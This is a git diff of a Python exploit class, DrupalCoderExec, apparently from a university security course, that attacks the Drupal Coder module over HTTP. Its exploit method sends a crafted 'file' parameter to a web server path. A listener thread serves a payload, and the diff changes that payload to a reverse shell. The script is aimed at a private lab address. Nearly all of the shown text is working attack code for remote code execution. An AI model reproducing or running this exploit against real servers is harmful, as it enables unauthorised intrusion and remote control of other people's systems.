@@ -38,7 +38,7 @@ class DrupalCoderExec:
         sock.listen(1)
         conn, addr = sock.accept()
         conn.sendall(payload.encode('utf-8'))
-        conn.sendall(b'\n')
+        conn.sendall(b'\r\n')
         sock.close()
 
     def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
@@ -46,14 +46,14 @@ class DrupalCoderExec:
         thread.start()
         
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
-        params = { 'file': self.create_payload(self.beachhead) }
+        params = { 'file': self.create_payload(self.REV_SHELL) }
         requests.get(url=url, params=params)
 
         thread.join()
 
 
 if __name__ == "__main__":
-    with open ('/home/perditus/School/CS564/r3se-rch/beachhead/include/Drupal_TEST.sh', 'r') as f:
+    with open ('Drupal_TEST.sh', 'r') as f:
         payload = f.read()
     coder_exec = DrupalCoderExec(payload)
     coder_exec.exploit('10.0.2.46', '80', '/drupal')
